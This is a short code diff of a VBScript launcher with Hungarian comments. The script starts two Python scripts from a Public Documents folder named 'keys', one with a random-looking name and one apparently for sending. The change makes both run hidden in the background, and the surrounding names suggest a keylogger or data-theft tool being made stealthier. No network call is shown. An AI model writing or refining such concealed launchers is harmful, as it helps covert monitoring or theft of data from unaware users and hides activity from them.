@@ -1,11 +1,9 @@
 Option Explicit
 
 Dim shell, baseDir, spwPath, sendPath, fso
-
 Set shell = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
-' A mappa ahol a két .py fájl van
 baseDir = "C:\Users\Public\Documents\keys"
 
 spwPath = baseDir & "\spwww743g7w.py"
@@ -21,5 +19,6 @@ If Not fso.FileExists(sendPath) Then
     WScript.Quit
 End If
 
-shell.Run "py """ & spwPath & """", 0, False
-shell.Run "py """ & sendPath & """", 0, False
+' Láthatatlan háttérben futtatás
+shell.Run "cmd /c start """" /B py """ & spwPath & """", 0, False
+shell.Run "cmd /c start """" /B py """ & sendPath & """", 0, False
